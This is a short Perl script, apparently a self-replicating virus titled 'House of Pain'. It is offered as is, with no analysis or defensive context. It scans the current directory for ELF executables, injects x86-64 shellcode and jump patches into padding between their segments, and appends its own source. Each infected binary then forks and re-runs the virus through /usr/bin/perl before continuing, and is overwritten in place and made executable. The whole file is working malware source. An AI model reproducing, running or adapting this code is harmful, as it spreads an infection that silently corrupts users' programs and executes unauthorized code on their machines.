#!/usr/bin/perl
# House of Pain - by isra
use File::Copy;
sub r{read$_[0],$x,$_[1];return$x}
sub k{seek$_[0],$_[1],0}
sub w{syswrite$_[0],$_[1]}

$p1="\xe8\x44\x00\x00\x00\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x65\x72\x6c"
."\x00\x2d\x78\x00";
$p2="\x00\x5e\x48\x31\xc0\xb8\x39\x00\x00\x00\x0f\x05\x85\xc0\x75\x2e\x48\x8d"
."\x3e\x48\x31\xd2\x52\x48\x8d\x5e\x11\x53\x48\x8d\x5e\x0e\x53\x57\x48\x89"
."\xe6\x48\x31\xc0\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05\x48\x21"
."\xd2\xb8\x3c\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\x31\xd2";
$s=length($p1)+length($p2)+50;

foreach $f(glob qq{"./*"}){
	next if(!-f$f);next if($f eq$0);

	$fs=(stat$f)[7];
	$vx="\n";$r="__"."END__";$fn=0;
	open my$vh,'<',$0; while(<$vh>){
		$fn++ if($_=~"#!/usr/bin/perl");$vx.=$_ if($fn);last if($_=~/$r/);
	} $vxs=length($vx);

	open$h,'<:raw',$f; my@e=unpack("C a a a C12 S2 I q3 I S6",r($h,64));
	next if($e[0]!=127&&$e[1]!~'E'&&$e[2]!~"L"&&$e[3]!~"F");

	$q=0;open$qh,'<:raw',$f;
	while(<$qh>){if($_=~"#!/usr/bin/perl"){$q++;last}}next if($q);

	k($h,$e[21]);for($i=0;$i<18;$i++){
		@u=unpack("I2 q4 I2 q2",r($h,$e[26]));
		if($u[2]==6){ 
			($y1,$z1)=($u[4],$u[5]) if(!$y1);
			($y2,$z2)=($u[4],$u[5]) if(!$y2 && $i>12 && $u[8]==4);
		} last if($y2);
	} next if(!$y1 or !$y2);

	@u=unpack("I2 q4 I2 q2",r($h,$e[26]));next if($u[4]-($y2+$z2)<$s+$vxs);
	open$t,'>:raw',"$f.t";k($h,0);w($t,r($h,$y1+$z1-1));

	$d=$y2+$z2-$y1-$z1-7;$j1="\x90\xe9".pack("V",$d)."\xc3";r($h,7);w($t,$j1);
	w($t,r($h,$d+1));r($h,$s);w($t,$p1);@c=split//,$f;
	for($i=2;$i<length($f);$i++){ w($t,pack("C",(hex unpack("H2",$c[$i]))))}
	for($i=length($f)-2;$i<50;$i++){ w($t,pack("C",0x0))}

	w($t,$p2);$j2="\xe9".pack("V",-$d-$s-7);w($t,$j2);r($h,5);
	w($t,$vx);r($h,$vxs);w($t,r($h,$fs-($y2+$z2+$s+$vxs+5)));
	unlink$f;copy("$f.t",$f);unlink"$f.t";chmod 0755,$f;
}

print "jump!  "x4;

__END__


